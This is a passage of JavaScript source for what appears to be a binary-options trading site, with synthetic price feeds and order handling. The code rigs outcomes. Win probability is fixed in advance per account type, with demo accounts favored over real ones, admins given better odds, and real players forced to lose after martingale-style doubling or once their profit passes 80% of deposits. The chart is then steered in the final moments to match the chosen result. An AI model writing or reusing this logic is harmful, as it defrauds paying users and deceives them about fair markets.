(function (D6) {
  'use strict';

  var C = D6.CONFIG;
  var markets = {};
  var trades = [];
  var payoutLive = {};
  var lastOrderAt = 0;
  var sessionNonce = D6.uid();
  var orderSeq = 0;
  // Max 2 trades ouverts simultanés par compte.
  var MAX_OPEN = (C.MAX_OPEN || 2);
  var CANDLE_MS = 1000;
  var HISTORY_SEC = 240;
  var synthCache = {};

  function u32(n) {
    n = Math.imul(n ^ (n >>> 16), 2246822507);
    n = Math.imul(n ^ (n >>> 13), 3266489909);
    return (n ^ (n >>> 16)) >>> 0;
  }

  function uhash01(i, salt) {
    return u32(Math.imul(i | 0, 374761393) ^ Math.imul(salt | 0, 668265263)) / 4294967296;
  }

  function valueNoise(t, salt) {
    var i = Math.floor(t);
    var f = t - i;
    var u = f * f * (3 - 2 * f);
    return uhash01(i, salt) * (1 - u) + uhash01(i + 1, salt) * u;
  }

  function canonAssetId(id) {
    if (id === 'boom300' || id === 'pulseai') return C.ASSETS.titanpulse ? 'titanpulse' : 'v100';
    return C.ASSETS[id] ? id : 'v100';
  }

  // Profils indépendants : seed + vol + dérive + spikes (pas le même tableau + offset).
  function feedProfile(assetId) {
    switch (assetId) {
      case 'stable':
        return { salt: 221713, vol: 0.14, drift: 0, f1: 0.019, f2: 0.041, f3: 0.007, a1: 6, a2: 3.5, a3: 8, spike: null, stair: null };
      case 'v75':
        return { salt: 551903, vol: 0.62, drift: 0, f1: 0.033, f2: 0.071, f3: 0.014, a1: 14, a2: 9, a3: 22, spike: null, stair: null };
      case 'crash300':
        return { salt: 771001, vol: 0.35, drift: 0, f1: 0.01, f2: 0.022, f3: 0.005, a1: 2.2, a2: 1.4, a3: 3, spike: null, stair: null, crashBoom: 'crash' };
      case 'boomspike':
        return { salt: 882119, vol: 0.35, drift: 0, f1: 0.01, f2: 0.022, f3: 0.005, a1: 2.2, a2: 1.4, a3: 3, spike: null, stair: null, crashBoom: 'boom' };
      case 'apex500':
        return { salt: 440501, vol: 1, drift: 0, kind: 'apex' };
      case 'horizon50':
        return { salt: 550050, vol: 1, drift: 0, kind: 'horizon' };
      case 'goldtrend':
        return { salt: 660160, vol: 1, drift: 0, kind: 'gold' };
      case 'nexusprime':
        return { salt: 770870, vol: 1, drift: 0, kind: 'nexus' };
      case 'titanpulse':
        return { salt: 991177, vol: 1, drift: 0, kind: 'titan' };
      case 'v100':
      default:
        return { salt: 904177, vol: 1.05, drift: 0, f1: 0.041, f2: 0.093, f3: 0.017, a1: 18, a2: 11, a3: 32, spike: null, stair: null };
    }
  }

  function clampIndexPrice(p) {
    var n = Number(p);
    if (!isFinite(n)) return 1000;
    return Math.round(Math.max(1000, Math.min(9999.99, n)) * 100) / 100;
  }

  /** CRASH/BOOM type Deriv : petites bougies de tendance + spike rare. */
  function crashBoomCandleOHLC(asset, bucket) {
    var isCrash = asset.id === 'crash300';
    var salt = isCrash ? 771001 : 882119;
    var base = Number(asset.basePrice) || (isCrash ? 4210.55 : 5890.33);
    var slow = Math.sin(bucket * 0.017) * 55 + Math.cos(bucket * 0.009) * 28;
    var micro = (uhash01(bucket, salt) - 0.5) * 6;
    var o = base + slow + micro;
    var period = 8 + Math.floor(uhash01(Math.floor(bucket / 50), salt + 3) * 7);
    var spike = (bucket % period) === (period - 1) && uhash01(bucket, salt + 11) > 0.12;
    var c;
    var h;
    var l;
    if (isCrash) {
      if (spike) {
        c = o - (22 + uhash01(bucket, salt + 7) * 58);
        h = o + 0.4 + uhash01(bucket, salt + 8) * 2.2;
        l = c - uhash01(bucket, salt + 9) * 7;
      } else {
        c = o + (0.55 + uhash01(bucket, salt + 7) * 3.4);
        h = c + uhash01(bucket, salt + 8) * 1.5;
        l = o - uhash01(bucket, salt + 9) * 1.9;
      }
    } else if (spike) {
      /* Boom Spike : inverse du Crash 300 — pic vertical vert, même amplitude. */
      c = o + (22 + uhash01(bucket, salt + 7) * 58);
      l = o - 0.4 - uhash01(bucket, salt + 8) * 2.2;
      h = c + uhash01(bucket, salt + 9) * 7;
    } else {
      c = o - (0.55 + uhash01(bucket, salt + 7) * 3.4);
      l = c - uhash01(bucket, salt + 8) * 1.5;
      h = o + uhash01(bucket, salt + 9) * 1.9;
    }
    h = Math.max(h, o, c);
    l = Math.min(l, o, c);
    return {
      o: clampIndexPrice(o),
      h: clampIndexPrice(h),
      l: clampIndexPrice(l),
      c: clampIndexPrice(c),
      t: bucket * CANDLE_MS
    };
  }

  function synthCrashBoomPrice(conf, tSec) {
    var t = Number(tSec) || 0;
    var bucket = Math.floor(t);
    var frac = Math.min(1, Math.max(0, t - bucket));
    var full = crashBoomCandleOHLC(conf, bucket);
    var mid = full.o + (full.c - full.o) * frac;
    mid = Math.max(full.l, Math.min(full.h, mid));
    return clampIndexPrice(mid);
  }

  function spikeAt(t, salt, dir) {
    var period = dir === 'down' ? 9.5 : 10.5;
    var epoch = Math.floor(t / period);
    var roll = uhash01(epoch, salt + (dir === 'down' ? 17 : 31));
    if (roll < 0.78) return 0;
    var phase = (t - epoch * period) / period;
    var amp = 28 + uhash01(epoch, salt + 99) * 55;
    var shape = phase < 0.22
      ? Math.sin((phase / 0.22) * Math.PI)
      : Math.max(0, 1 - (phase - 0.22) / 0.55) * 0.35;
    return (dir === 'down' ? -1 : 1) * amp * shape;
  }

  function synthPrice(asset, tSec) {
    var id = asset.id || asset;
    var conf = typeof asset === 'object' ? asset : (C.ASSETS[id] || { id: id, basePrice: 10000 });
    var p = feedProfile(conf.id);
    var t = Number(tSec) || 0;
    if (conf.id === 'crash300' || conf.id === 'boomspike' || p.crashBoom === 'crash' || p.crashBoom === 'boom') {
      return synthCrashBoomPrice(conf, t);
    }
    if (p.kind === 'apex') {
      var wA = Math.sin(t * 0.31) * 7.5 + Math.sin(t * 0.67 + 0.4) * 4.8 + Math.cos(t * 1.15) * 2.6;
      var nA = (valueNoise(t * 4.2, p.salt) - 0.5) * 5.5 + (valueNoise(t * 11, p.salt + 2) - 0.5) * 2.8;
      return conf.basePrice + wA + nA;
    }
    if (p.kind === 'horizon') {
      var wH = Math.sin(t * 0.016) * 18 + Math.cos(t * 0.0075) * 8;
      var nH = (valueNoise(t * 0.95, p.salt) - 0.5) * 2.1
        + (valueNoise(t * 3.6, p.salt + 3) - 0.5) * 0.85;
      return conf.basePrice + wH + nH;
    }
    if (p.kind === 'gold') {
      var wG = Math.sin(t * 0.0038) * 88 + Math.sin(t * 0.0016 + 0.9) * 42;
      var nG = (valueNoise(t * 0.62, p.salt) - 0.5) * 11
        + (valueNoise(t * 2.4, p.salt + 5) - 0.5) * 3.4;
      return conf.basePrice + wG + nG;
    }
    if (p.kind === 'nexus') {
      var half = 30;
      var walk = (valueNoise(t * 0.075, p.salt) - 0.5) * 2.15;
      var slow = Math.sin(t * 0.038 + valueNoise(t * 0.021, p.salt + 2) * 2.4) * 0.42;
      var edge = Math.tanh((walk + slow) * 1.35);
      var nX = (valueNoise(t * 1.15, p.salt) - 0.5) * 7.4
        + (valueNoise(t * 4.4, p.salt + 9) - 0.5) * 2.6;
      var epoch = Math.floor(t / 9);
      var fake = 0;
      if (uhash01(epoch, p.salt + 31) > 0.70) {
        var ph = t / 9 - epoch;
        if (ph < 0.36) {
          var dirN = uhash01(epoch, p.salt + 44) > 0.5 ? 1 : -1;
          fake = dirN * (7 + uhash01(epoch, p.salt + 51) * 11) * Math.sin((ph / 0.36) * Math.PI);
        }
      }
      return conf.basePrice + edge * half + nX + fake;
    }
    if (p.kind === 'titan') {
      var epoch = Math.floor(t / 5.5);
      var dir = uhash01(epoch, p.salt) > 0.5 ? 1 : -1;
      var amp = 28 + uhash01(epoch, p.salt + 4) * 95;
      var sawT = (t / 5.5) - epoch;
      var saw = (sawT < 0.5 ? sawT * 2 : 2 - sawT * 2) - 0.5;
      var burst = 0;
      if (uhash01(epoch, p.salt + 21) > 0.42) {
        burst = dir * amp * Math.sin(Math.min(1, sawT * 3.2) * Math.PI);
      }
      var chop = (valueNoise(t * 2.4, p.salt) - 0.5) * 36
        + (valueNoise(t * 7.1, p.salt + 8) - 0.5) * 22
        + Math.sin(t * 0.19) * 18;
      var pT = conf.basePrice + saw * amp * 0.55 + burst + chop;
      var lo = conf.basePrice - 220;
      var hi = conf.basePrice + 220;
      if (pT < lo) pT = lo + (lo - pT) * 0.12;
      if (pT > hi) pT = hi - (pT - hi) * 0.12;
      return pT;
    }
    if (conf.id === 'pulseai' || p.pulse) {
      var waveP = Math.sin(t * p.f1) * p.a1
        + Math.sin(t * p.f2 + 0.7) * p.a2
        + Math.cos(t * p.f3) * p.a3
        + Math.sin(t * 0.17) * 3.4;
      var compress = 0.52 + 0.48 * (0.5 + 0.5 * Math.sin(t * 0.0075));
      var nP = (valueNoise(t, p.salt) - 0.5) * 12
        + (valueNoise(t * 3.05, p.salt + 7) - 0.5) * 5.5
        + (valueNoise(t * 11.4, p.salt + 19) - 0.5) * 2.1;
      var epoch = Math.floor(t / 13);
      var brk = 0;
      if (uhash01(epoch, p.salt + 55) > 0.68) {
        var ph = t / 13 - epoch;
        var dir = uhash01(epoch, p.salt + 77) > 0.5 ? 1 : -1;
        brk = dir * (6 + uhash01(epoch, p.salt + 91) * 7) * Math.sin(Math.min(1, ph) * Math.PI);
      }
      return clampIndexPrice(conf.basePrice + (waveP + nP) * compress * p.vol + brk);
    }
    var wave = Math.sin(t * p.f1) * p.a1
      + Math.cos(t * p.f2) * p.a2
      + Math.sin(t * p.f3) * p.a3;
    var n = (valueNoise(t, p.salt) - 0.5) * 16
      + (valueNoise(t * 2.17, p.salt + 41) - 0.5) * 7
      + (valueNoise(t * 8.3, p.salt + 113) - 0.5) * 2.4;
    var spike = p.spike ? spikeAt(t, p.salt, p.spike) : 0;
    return conf.basePrice + (wave + n) * p.vol + spike + p.drift * (t % 86400) * 0.04;
  }

  function candleForBucket(asset, bucket) {
    if (asset.id === 'crash300' || asset.id === 'boomspike') {
      return crashBoomCandleOHLC(asset, bucket);
    }
    var start = bucket * CANDLE_MS;
    var o = synthPrice(asset, start / 1000);
    var h = o;
    var l = o;
    var c = o;
    var k;
    for (k = 1; k <= 4; k++) {
      var p = synthPrice(asset, (start + k * 200) / 1000);
      if (p > h) h = p;
      if (p < l) l = p;
      c = p;
    }
    return { o: o, h: h, l: l, c: c, t: start };
  }

  function formingCandle(asset, nowMs) {
    if (asset.id === 'crash300' || asset.id === 'boomspike') {
      var bucketCb = Math.floor(nowMs / CANDLE_MS);
      var full = crashBoomCandleOHLC(asset, bucketCb);
      var frac = (nowMs % CANDLE_MS) / CANDLE_MS;
      var cLive = full.o + (full.c - full.o) * frac;
      var hLive = Math.max(full.o, cLive);
      var lLive = Math.min(full.o, cLive);
      var wickUp = (full.h - Math.max(full.o, full.c)) * frac;
      var wickDn = (Math.min(full.o, full.c) - full.l) * frac;
      hLive += wickUp;
      lLive -= wickDn;
      return {
        o: full.o,
        h: clampIndexPrice(Math.max(hLive, full.o, cLive)),
        l: clampIndexPrice(Math.min(lLive, full.o, cLive)),
        c: clampIndexPrice(cLive),
        t: bucketCb * CANDLE_MS
      };
    }
    var bucket = Math.floor(nowMs / CANDLE_MS);
    var start = bucket * CANDLE_MS;
    var o = synthPrice(asset, start / 1000);
    var h = o;
    var l = o;
    var c = synthPrice(asset, nowMs / 1000);
    var elapsed = nowMs - start;
    var k;
    var steps = Math.max(1, Math.min(5, Math.floor(elapsed / 200) + 1));
    for (k = 1; k < steps; k++) {
      var p = synthPrice(asset, (start + k * 200) / 1000);
      if (p > h) h = p;
      if (p < l) l = p;
    }
    h = Math.max(h, c);
    l = Math.min(l, c);
    return { o: o, h: h, l: l, c: c, t: start };
  }

  function rebuildHistory(asset, nowMs) {
    var bucket = Math.floor(nowMs / CANDLE_MS);
    var start = bucket - HISTORY_SEC + 1;
    var candles = [];
    var history = [];
    var i;
    var b;
    var c;
    for (i = 0; i < HISTORY_SEC - 1; i++) {
      b = start + i;
      c = candleForBucket(asset, b);
      candles.push(c);
      history.push(c.c);
    }
    var forming = formingCandle(asset, nowMs);
    history.push(forming.c);
    return { candles: candles, forming: forming, history: history, to: bucket - 1 };
  }

  function syncMarket(market, asset, nowMs) {
    nowMs = nowMs || Date.now();
    var bucket = Math.floor(nowMs / CANDLE_MS);
    var st = synthCache[asset.id];
    if (!st || st.to !== bucket - 1) {
      if (st && st.to === bucket - 2 && st.candles && st.candles.length) {
        var done = candleForBucket(asset, bucket - 1);
        st.candles.push(done);
        if (st.candles.length > HISTORY_SEC - 1) st.candles.shift();
        st.to = bucket - 1;
      } else {
        st = rebuildHistory(asset, nowMs);
        synthCache[asset.id] = st;
      }
    }
    var forming = formingCandle(asset, nowMs);
    var history = st.history || [];
    history.length = 0;
    var hi;
    for (hi = 0; hi < st.candles.length; hi++) history.push(st.candles[hi].c);
    history.push(forming.c);
    st.history = history;
    market.price = forming.c;
    market.candles = st.candles;
    market.candle = forming;
    market.history = history;
    market.ticksInCandle = Math.floor((nowMs % CANDLE_MS) / 80);
    return market;
  }

  function seedMarket(assetId) {
    var asset = C.ASSETS[assetId];
    var market = {
      id: assetId,
      price: asset.basePrice,
      history: [],
      candles: [],
      candle: { o: asset.basePrice, h: asset.basePrice, l: asset.basePrice, c: asset.basePrice },
      ticksInCandle: 0,
      payout: C.REAL_PAYOUT
    };
    return syncMarket(market, asset, Date.now());
  }

  function rollPayout(asset, mode) {
    if (mode === 'real') return C.REAL_PAYOUT;
    var span = asset.payoutMax - asset.payoutMin;
    return +(asset.payoutMin + Math.random() * span).toFixed(3);
  }

  function ensureMarkets() {
    var id;
    for (id in C.ASSETS) {
      if (markets[id]) continue;
      var asset = C.ASSETS[id];
      markets[id] = {
        id: id,
        price: asset.basePrice,
        history: [],
        candles: [],
        candle: { o: asset.basePrice, h: asset.basePrice, l: asset.basePrice, c: asset.basePrice },
        ticksInCandle: 0,
        payout: C.REAL_PAYOUT
      };
    }
  }

  function wakeMarket(assetId) {
    var id = canonAssetId(assetId);
    ensureMarkets();
    if (!synthCache[id] && C.ASSETS[id]) {
      syncMarket(markets[id], C.ASSETS[id], Date.now());
    }
    return markets[id];
  }

  function makeSeal(payload) {
    var s = sessionNonce + '|' + payload + '|' + orderSeq;
    var h = 2166136261;
    var i;
    for (i = 0; i < s.length; i++) {
      h ^= s.charCodeAt(i);
      h = Math.imul(h, 16777619);
    }
    return (h >>> 0).toString(16);
  }

  function automationDetected() {
    if (navigator.webdriver) return true;
    if (window.callPhantom || window._phantom) return true;
    if (window.domAutomation || window.domAutomationController) return true;
    return false;
  }

  function balOf(user, mode) {
    if (D6.Store.balanceMode) return D6.Store.balanceMode(user, mode);
    return D6.Store.balanceOf(user);
  }

  function setBal(user, mode, value) {
    if (D6.Store.setBalanceMode) D6.Store.setBalanceMode(user, mode, value);
    else {
      var prev = user.mode;
      user.mode = mode;
      D6.Store.setBalance(user, value);
      user.mode = prev;
    }
  }

  function stakeCap(user, stake, mode) {
    mode = mode || user.mode;
    var balance = balOf(user, mode);
    if (stake < C.MIN_STAKE) {
      return { ok: false, cap: C.MIN_STAKE, reason: D6.I18N.t('minStake') + ' ' + D6.fmtFCFA(C.MIN_STAKE) };
    }
    if (stake > balance) {
      return { ok: false, cap: balance, reason: D6.I18N.t('insufficient') };
    }
    return { ok: true, cap: balance };
  }

  function expiryOf(t) {
    return t.expiryTime || t.expiresAt;
  }

  function isLive(t) {
    return t && !t.settled && t.status === 'open' && Date.now() < expiryOf(t);
  }

  function isOpen(t) {
    return t && !t.settled && (t.status === 'open' || !t.status);
  }

  function openForMode(mode) {
    return trades.filter(function (t) {
      return isOpen(t) && t.mode === mode;
    });
  }

  function syncTime(t) {
    var left = (expiryOf(t) - Date.now()) / 1000;
    t.timeLeft = left > 0 ? left : 0;
    return t.timeLeft;
  }

  function publicTrade(t) {
    if (!t) return null;
    syncTime(t);
    return Object.freeze({
      id: t.id,
      assetId: t.assetId,
      side: t.side,
      stake: t.stake,
      duration: t.duration,
      timeLeft: t.timeLeft,
      entryPrice: t.entryPrice,
      openPrice: t.entryPrice,
      payout: t.payout,
      payoutMult: t.payout,
      startedAt: t.startedAt,
      startTime: t.startTime || t.startedAt,
      openedAt: t.startTime || t.startedAt,
      expiryTime: expiryOf(t),
      expiresAt: expiryOf(t),
      expiryAt: expiryOf(t),
      settled: !!t.settled,
      status: t.status || (t.settled ? 'closed' : 'open'),
      mode: t.mode,
      accountType: t.mode
    });
  }

  function persistOpen(user) {
    if (!user) return;
    user.openTrades = trades.filter(isOpen).map(function (t) {
      return {
        id: t.id,
        userId: t.userId,
        assetId: t.assetId,
        side: t.side,
        stake: t.stake,
        payout: t.payout,
        entryPrice: t.entryPrice,
        duration: t.duration,
        durationMs: t.durationMs,
        startTime: t.startTime,
        startedAt: t.startedAt,
        expiryTime: expiryOf(t),
        expiresAt: expiryOf(t),
        mode: t.mode,
        status: 'open',
        settled: false,
        seq: t.seq
      };
    });
    D6.Store.saveUser(user);
  }

  function closePriceAt(assetId, expiryMs) {
    var asset = C.ASSETS[assetId];
    if (!asset) return 0;
    return synthPrice(asset, expiryMs / 1000);
  }

  function normalizeOdds(v) {
    var list = C.ODDS_MULT || [1.88, 6, 11, 51];
    var n = Number(v);
    var i;
    for (i = 0; i < list.length; i++) {
      if (Math.abs(list[i] - n) < 0.001) return list[i];
    }
    return C.DEFAULT_ODDS != null ? C.DEFAULT_ODDS : 1.88;
  }

  function oddsKey(mult) {
    var o = normalizeOdds(mult);
    if (Math.abs(o - 1.88) < 0.001) return '1.88';
    if (Math.abs(o - 6) < 0.001) return '6';
    if (Math.abs(o - 11) < 0.001) return '11';
    if (o >= 50) return '51';
    return '1.88';
  }

  function winRateForOdds(mult, map) {
    map = map || C.ODDS_WIN_RATE || {};
    var o = normalizeOdds(mult);
    var k = oddsKey(o);
    if (map[k] != null && isFinite(Number(map[k]))) return Number(map[k]);
    var m = Math.max(1.01, Number(o) || 1.88);
    var r = 1 / (m * 1.25);
    return Math.max(0.001, Math.min(0.49, r));
  }

  function isAdminUser(user) {
    if (!user) return false;
    if (user.role === 'admin') return true;
    if (user.id === 'admin_master') return true;
    var mail = String(user.email || '').toLowerCase();
    var adminMail = String((C.ADMIN_EMAIL) || 'admin@orolado.com').toLowerCase();
    if (mail !== '' && mail === adminMail) return true;
    try {
      if (D6.Auth && typeof D6.Auth.isAdmin === 'function' && D6.Auth.isAdmin(user)) return true;
    } catch (eA) { /* ignore */ }
    return false;
  }

  function forceExitPrice(entry, isCall, won, assetId, harsh) {
    var base = Math.max((C.ASSETS[assetId].tickNoise || 0.3) * 0.45, 0.28);
    var nudge = harsh ? Math.max(base * 3.2, 1.1) : base;
    return entry + (won
      ? (isCall ? 1 : -1)
      : (isCall ? -1 : 1)) * nudge;
  }

  /** Arbitrage étanche — démo / admin réel / joueur réel. */
  function resolveWinProbability(user, trade, mode) {
    var demoMap = C.ODDS_WIN_RATE_DEMO || {
      '1.88': 0.58, '6': 0.20, '11': 0.10, '51': 0.02
    };
    var adminRealMap = C.ODDS_WIN_RATE_ADMIN_REAL || C.ODDS_WIN_RATE_FAVORABLE || {
      '1.88': 0.70, '6': 0.255, '11': 0.127, '51': 0.025
    };
    var realMap = C.ODDS_WIN_RATE || {
      '1.88': 0.42, '6': 0.12, '11': 0.05, '51': 0.008
    };
    var admin = isAdminUser(user);
    var isDemo = mode !== 'real';
    var harsh = false;

    if (isDemo) {
      return { winProbability: winRateForOdds(trade.payout, demoMap), harsh: false, profile: 'B' };
    }
    if (admin) {
      return { winProbability: winRateForOdds(trade.payout, adminRealMap), harsh: false, profile: 'A' };
    }

    var winProbability = winRateForOdds(trade.payout, realMap);
    var losses = Number(user.consecutiveLosses) || 0;
    var lastBet = Number(user.lastBetAmount) || Number(user.lastStake) || 0;
    var currentBet = Number(trade.stake) || 0;
    var doubling = lastBet > 0 && currentBet >= lastBet * 1.8;

    if (losses >= 2 && doubling) {
      winProbability = 0;
      harsh = true;
    }

    var deposited = Number(user.realDepositTotal) || 0;
    if (deposited > 0) {
      var wallet = balOf(user, 'real');
      var netProfit = wallet - deposited;
      if (netProfit > deposited * 0.80) {
        var k = oddsKey(trade.payout);
        var ceilRate = (k === '1.88') ? 0.15 : 0.01;
        winProbability = Math.min(winProbability, ceilRate);
      }
    }

    return { winProbability: winProbability, harsh: harsh, profile: 'C' };
  }

  function decideTradeOutcome(user, trade, mode) {
    if (trade && trade._outcomeReady) {
      return { wantWon: !!trade._wantWon, harsh: !!trade._harsh, target: Number(trade._exitTarget) };
    }
    var verdict = resolveWinProbability(user, trade, mode);
    var wantWon = verdict.harsh ? false : (Math.random() < verdict.winProbability);
    var isCall = trade.side === 'call';
    var target = forceExitPrice(trade.entryPrice, isCall, wantWon, trade.assetId, verdict.harsh);
    trade._wantWon = wantWon;
    trade._harsh = !!verdict.harsh;
    trade._exitTarget = target;
    trade._outcomeReady = true;
    return { wantWon: wantWon, harsh: !!verdict.harsh, target: target };
  }

  function prepareLastSecondSteer(now) {
    var user = D6.Store && D6.Store.current ? D6.Store.current() : null;
    if (!user) return;
    var i;
    for (i = 0; i < trades.length; i++) {
      var tr = trades[i];
      if (!isLive(tr) || tr.userId !== user.id) continue;
      var left = expiryOf(tr) - now;
      if (left > 220 || left < 0) continue;
      var decided = decideTradeOutcome(user, tr, tr.mode === 'real' ? 'real' : 'demo');
      if (D6.Chart && D6.Chart.steerClose && D6.Chart.lastAsset && D6.Chart.lastAsset() === tr.assetId) {
        D6.Chart.steerClose(decided.target, Math.max(80, left));
      }
    }
  }

  ensureMarkets();
  Object.keys(C.ASSETS).forEach(function (id) {
    payoutLive[id] = markets[id].payout;
  });

  var api = {
    markets: markets,
    payoutLive: payoutLive,
    onExpire: null,
    onSettled: null,

    getMarket: function (id) {
      return wakeMarket(id);
    },

    getTrade: function () {
      var live = trades.filter(isLive);
      if (!live.length) return null;
      var best = live[0];
      var i;
      for (i = 1; i < live.length; i++) {
        if (expiryOf(live[i]) < expiryOf(best)) best = live[i];
      }
      return publicTrade(best);
    },

    getTrades: function (mode) {
      return trades.filter(isLive).filter(function (t) {
        return !mode || t.mode === mode;
      }).map(function (t) { return publicTrade(t); });
    },

    liveCount: function (mode) {
      if (mode) return openForMode(mode).length;
      return trades.filter(isOpen).length;
    },

    restoreOpen: function (user) {
      if (!user) return 0;
      trades = [];
      var list = user.openTrades || [];
      var i;
      for (i = 0; i < list.length; i++) {
        var raw = list[i];
        if (!raw || !raw.id) continue;
        if (raw.userId && raw.userId !== user.id) continue;
        if (raw.settled || raw.status === 'won' || raw.status === 'lost' || raw.status === 'void') continue;
        trades.push({
          id: raw.id,
          assetId: canonAssetId(raw.assetId),
          side: raw.side === 'put' ? 'put' : 'call',
          stake: D6.roundMoney(Number(raw.stake) || 0),
          duration: raw.duration || 10,
          durationMs: raw.durationMs || (raw.duration || 10) * 1000,
          timeLeft: 0,
          entryPrice: Number(raw.entryPrice) || 0,
          payout: Number(raw.payout) || C.REAL_PAYOUT,
          startTime: raw.startTime || raw.startedAt || Date.now(),
          startedAt: raw.startedAt || raw.startTime || Date.now(),
          expiryTime: raw.expiryTime || raw.expiresAt || raw.expiryAt,
          expiresAt: raw.expiresAt || raw.expiryTime || raw.expiryAt,
          mode: raw.mode === 'real' ? 'real' : 'demo',
          userId: user.id,
          seq: raw.seq || 0,
          settled: false,
          status: 'open'
        });
      }
      if (D6.Chart && D6.Chart.applyOpenTradeVisual) {
        for (i = 0; i < trades.length; i++) {
          try { D6.Chart.applyOpenTradeVisual(publicTrade(trades[i])); } catch (eR) { /* ignore */ }
        }
      }
      return trades.length;
    },

    refreshPayout: function (assetId, mode) {
      var asset = C.ASSETS[assetId];
      var u = D6.Store.current();
      var m = mode || (u && u.mode) || 'demo';
      payoutLive[assetId] = rollPayout(asset, m);
      markets[assetId].payout = payoutLive[assetId];
      return payoutLive[assetId];
    },

    tick: function (assetId) {
      ensureMarkets();
      var now = Date.now();
      var i;
      for (i = 0; i < trades.length; i++) {
        syncTime(trades[i]);
      }
      var id = canonAssetId(assetId);
      if (C.ASSETS[id]) {
        syncMarket(markets[id], C.ASSETS[id], now);
      }
      prepareLastSecondSteer(now);
    },

    placeOrder: function (user, opts) {
      if (automationDetected()) return { ok: false, reason: 'Session non sécurisée' };
      if (!user || !D6.Store.current() || D6.Store.current().id !== user.id) {
        return { ok: false, reason: 'Session invalide' };
      }
      var mode = user.mode === 'real' ? 'real' : 'demo';
      if (openForMode(mode).length >= MAX_OPEN) {
        return { ok: false, reason: D6.I18N.t('maxPositions') };
      }

      var nowPerf = performance.now();
      if (nowPerf - lastOrderAt < C.MIN_ORDER_MS) {
        return { ok: false, reason: D6.I18N.t('antibot') };
      }

      var stake = D6.roundMoney(Number(opts.stake) || 0);
      var duration = C.DURATIONS.indexOf(opts.duration) >= 0 ? opts.duration : C.DEFAULT_DURATION;
      var assetId = canonAssetId(opts.assetId);
      var side = opts.side === 'put' ? 'put' : 'call';
      var gate = stakeCap(user, stake, mode);
      if (!gate.ok) return gate;

      ensureMarkets();
      var market = markets[assetId];
      syncMarket(market, C.ASSETS[assetId], Date.now());
      var payout = normalizeOdds(opts.payout != null ? opts.payout : (opts.odds != null ? opts.odds : C.DEFAULT_ODDS));
      setBal(user, mode, balOf(user, mode) - stake);
      D6.Store.addTransaction(user, {
        type: 'stake',
        amount: -stake,
        mode: mode,
        note: (side === 'call' ? 'CALL' : 'PUT') + ' ' + C.ASSETS[assetId].short
      });

      orderSeq += 1;
      lastOrderAt = nowPerf;
      D6.holdRemote = true;
      var entry = market.price;
      if (D6.Chart && D6.Chart.lastClose && D6.Chart.lastAsset && D6.Chart.lastAsset() === assetId) {
        var drawnIn = Number(D6.Chart.lastClose());
        if (isFinite(drawnIn) && drawnIn > 0) entry = drawnIn;
      }
      var wall = Date.now();
      var durationMs = duration * 1000;
      var id = D6.uid();

      var t = {
        id: id,
        assetId: assetId,
        side: side,
        stake: stake,
        duration: duration,
        durationMs: durationMs,
        timeLeft: duration,
        entryPrice: entry,
        payout: payout,
        startTime: wall,
        startedAt: wall,
        expiryTime: wall + durationMs,
        expiresAt: wall + durationMs,
        mode: mode,
        userId: user.id,
        seq: orderSeq,
        settled: false,
        status: 'open'
      };
      trades.push(t);

      if (mode === 'real') {
        user.realStakeVolume = (user.realStakeVolume || 0) + stake;
        user.totalWageredSinceDeposit = Number(user.realStakeVolume) || 0;
        user.requiredWagering = D6.roundMoney((Number(user.realDepositTotal) || 0) * ((C.WAGER_MULTIPLIER) || 2));
      }
      user.lastStake = stake;
      // Ne pas écraser lastBetAmount ici : réservé à la clôture (anti-martingale).
      persistOpen(user);
      if (D6.Supabase && D6.Supabase.saveOrder) D6.Supabase.saveOrder(t, 'open');
      var pub = publicTrade(t);
      // Ligne CALL/PUT immédiate (sync) — ne pas attendre le prochain tick/F5.
      if (D6.Chart && D6.Chart.applyOpenTradeVisual) {
        try { D6.Chart.applyOpenTradeVisual(pub); } catch (eVis) { /* ignore */ }
      }
      return { ok: true, trade: pub };
    },

    resolve: function (user, tradeId) {
      if (!user || !trades.length) return null;
      var idx = -1;
      var i;
      var now = Date.now();
      if (tradeId) {
        for (i = 0; i < trades.length; i++) {
          if (trades[i].id === tradeId) { idx = i; break; }
        }
      } else {
        for (i = 0; i < trades.length; i++) {
          if (isOpen(trades[i]) && now >= expiryOf(trades[i])) { idx = i; break; }
        }
      }
      if (idx < 0) return null;
      var trade = trades[idx];
      if (trade.settled || trade.status === 'won' || trade.status === 'lost' || trade.status === 'void') {
        trades.splice(idx, 1);
        persistOpen(user);
        if (D6.Chart && D6.Chart.removeTradeVisual) {
          try { D6.Chart.removeTradeVisual(trade.id); } catch (e0) { /* ignore */ }
        }
        return null;
      }
      if (now < expiryOf(trade)) return null;

      // Idempotence : marquer avant crédit.
      trade.settled = true;

      if (user.id !== trade.userId) {
        if (D6.Chart && D6.Chart.removeTradeVisual) {
          try { D6.Chart.removeTradeVisual(trade.id); } catch (eGone) { /* ignore */ }
        }
        trades.splice(idx, 1);
        persistOpen(user);
        return null;
      }

      var mode = trade.mode === 'real' ? 'real' : 'demo';
      var isCall = trade.side === 'call';
      var expMs = expiryOf(trade);
      ensureMarkets();
      var mkt = markets[trade.assetId];
      if (mkt && C.ASSETS[trade.assetId]) {
        syncMarket(mkt, C.ASSETS[trade.assetId], expMs);
      }
      var entry = Number(trade.entryPrice);
      trade.payout = normalizeOdds(trade.payout);
      var voided = false;
      var decided = decideTradeOutcome(user, trade, mode);
      var exitPrice = decided.target;
      if (D6.Chart && D6.Chart.lastClose && D6.Chart.lastAsset && D6.Chart.lastAsset() === trade.assetId) {
        var drawn = Number(D6.Chart.lastClose());
        if (isFinite(drawn) && drawn > 0) exitPrice = drawn;
      }
      var won = decided.wantWon;
      if (isCall ? (exitPrice > entry) !== won : (exitPrice < entry) !== won) {
        exitPrice = decided.target;
      }
      if (D6.Chart && D6.Chart.steerClose) {
        try { D6.Chart.steerClose(exitPrice, 80); } catch (eSt) { /* ignore */ }
      }
      if (D6.Chart && D6.Chart.removeTradeVisual) {
        try { D6.Chart.removeTradeVisual(trade.id); } catch (e1) { /* ignore */ }
      }

      var payoutAmount = 0;
      var net = 0;
      var status = 'lost';

      if (voided) {
        status = 'void';
        payoutAmount = trade.stake;
        setBal(user, mode, balOf(user, mode) + trade.stake);
        net = 0;
        D6.Store.addTransaction(user, {
          type: 'void',
          amount: trade.stake,
          mode: mode,
          note: 'Égalité — mise rendue ' + C.ASSETS[trade.assetId].short
        });
      } else if (won) {
        status = 'won';
        payoutAmount = D6.roundMoney(trade.stake * trade.payout);
        setBal(user, mode, balOf(user, mode) + payoutAmount);
        net = payoutAmount - trade.stake;
        user.wins = (user.wins || 0) + 1;
